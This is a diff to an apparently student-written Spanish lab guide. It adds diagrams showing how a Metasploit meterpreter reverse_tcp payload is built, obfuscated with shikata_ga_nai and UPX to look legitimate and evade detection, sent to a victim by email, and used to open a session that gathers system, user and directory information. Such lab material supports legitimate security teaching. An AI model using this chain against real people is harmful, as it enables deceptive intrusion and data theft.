@@ -4,6 +4,22 @@ Grupo 04
 
 ---
 
+```mermaid
+sequenceDiagram
+    participant A as 🎭 Atacante (Kali)
+    participant V as 👤 Victima (Windows)
+    participant M as 🖥 msfconsole
+
+    A->>A: msfvenom genera payload .exe
+    A->>V: Envia archivo por correo o red
+    M->>M: exploit/multi/handler escuchando en puerto 4444
+    V->>V: Ejecuta el archivo
+    V-->>M: Conexion reversa automatica
+    M->>A: ✅ Sesion Meterpreter abierta
+    A->>V: sysinfo / getuid / dir
+    Note over A,V: Atacante ve info del sistema en tiempo real
+```
+
 ## De que trata
 
 Generar un archivo malicioso con Metasploit que parezca legitimo, enviarlo a la victima por correo o red social, y una vez ejecutado extraer informacion del sistema: datos del equipo, SID del usuario, nombre del usuario actual y listado del directorio.
@@ -85,6 +101,16 @@ msfvenom -p windows/meterpreter/reverse_tcp \
 - `-e x86/shikata_ga_nai` → encoder que ofusca el codigo
 - `-i 5` → pasar el encoder 5 veces (mas iteraciones = mas dificil de detectar)
 
+```mermaid
+flowchart LR
+    MS["msfvenom"] -->|genera| EX["archivo.exe\nWindows payload"]
+    EX -->|opcional| EN["Encoder\nshikata_ga_nai x5"]
+    EN -->|opcional| UP["UPX\ncomprimir"]
+    UP --> FI["archivo final\ncreible y ofuscado"]
+    FI -->|correo / red| V["Victima lo ejecuta"]
+    V -->|reverse TCP| KA["Kali puerto 4444\nmsfconsole listener"]
+```
+
 ### Paso 4: Preparar el listener en Kali
 
 Antes de enviar el archivo a la victima, Kali tiene que estar escuchando en el puerto 4444:
@@ -150,6 +176,17 @@ meterpreter >
 ```
 
 Ahora se extraen los datos que pide la practica:
+
+```mermaid
+flowchart TD
+    ME["meterpreter >"] --> SI["sysinfo\ninfo del sistema"]
+    ME --> GU["getuid\nnombre de usuario"]
+    ME --> SH["shell\nabrir cmd de Windows"]
+    SH --> WH["whoami /user\nSID del usuario"]
+    SH --> DI["dir\nlistado del directorio"]
+    SH --> NE["netstat -an\nconexiones activas"]
+    SI & WH & DI --> RE["📄 Documentar\npara el informe"]
+```
 
 **Informacion del sistema:**
 
